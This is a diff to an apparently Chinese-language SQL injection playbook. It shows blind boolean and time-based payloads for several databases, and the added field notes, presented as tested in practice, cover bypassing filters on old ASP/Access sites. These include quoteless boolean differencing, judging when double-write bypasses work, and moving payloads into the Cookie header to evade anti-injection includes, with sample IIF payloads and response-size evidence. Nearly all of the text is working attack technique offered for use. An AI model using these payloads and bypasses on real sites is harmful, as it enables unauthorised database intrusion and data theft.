@@ -70,7 +70,7 @@ id=1 AND 1=1
 id=1 AND sleep(5)
 id=1 AND IF(SUBSTRING(user(),1,1)='r',sleep(5),0)
 ```
-> **ASP/Access 实测注记（20260830）**：单引号黑名单拦截（统一弹"非法操作"页）时，数字型免引号 `AND 1=1 / AND 1=2` 布尔差分直通有效。Access 无 sleep——布尔差分是唯一时间无关通道；表枚举 `and (select count(*) from admin)>=0` 若被关键字过滤拦回，先观察过滤字典再定绕过，不要连续硬试。
+> **ASP/Access 实测注记（20260830）**：单引号黑名单拦截（统一弹"非法操作"页）时，数字型免引号 `AND 1=1 / AND 1=2` 布尔差分直通有效。Access 无 sleep——布尔差分是唯一时间无关通道；表枚举 `and (select count(*) from admin)>=0` 若被关键字过滤拦回，先观察过滤字典再定绕过，不要连续硬试。双写绕过只对"剥除型"过滤器有效，对"拦截页型"过滤器（弹固定非法操作页）无效——先判型再选技。
 
 ### 2.5 时间盲注的双层延时（绕过 sleep 关键字）
 ```
@@ -79,6 +79,11 @@ id=1 AND (SELECT (CASE WHEN (1=1) THEN SLEEP(10) ELSE 1 END))
 id=1 AND dbms_pipe.receive_message('a',5)=1   # Oracle
 id=1; WAITFOR DELAY '0:0:5'--                 # MSSQL
 ```
+
+### 2.6 Cookie 注入通道（Request 合并型 / 过滤器旁路）
+
+【条件】老 ASP 站防注入 include 只扫 QueryString+Form、SQL 用 `Request("x")` 合并取值（20260830 实测：`select` 在 QS 位全被拦页，Cookie 位完全旁路）【操作】参数整体挪 Cookie：`Cookie: pkid=<payload>`；**value 内禁 `=`**（IIS 按等号切值），比较一律 `IIF(a>b,x,y)`（Jet）；空格/tab/括号/逗号实测无碍【证据】`pkid=IIF(4955>4954,4955,9999)` 渲染 vs `IIF(4955>9999,..)` 空页，三态 6759/499/625B【日期】20260830
+> 游标墙：ASP+ODBC/Jet 场景，任何位置子查询（标量 RHS / EXISTS / 算术包 / ±TOP）一律 `80040e21 ODBC 驱动程序不支持所需的属性`——连接层拒绝而非过滤/语法问题，换位换写法无效，直接判数据抽取死路止损（20260830，4 变体实测）。
 
 ---
 
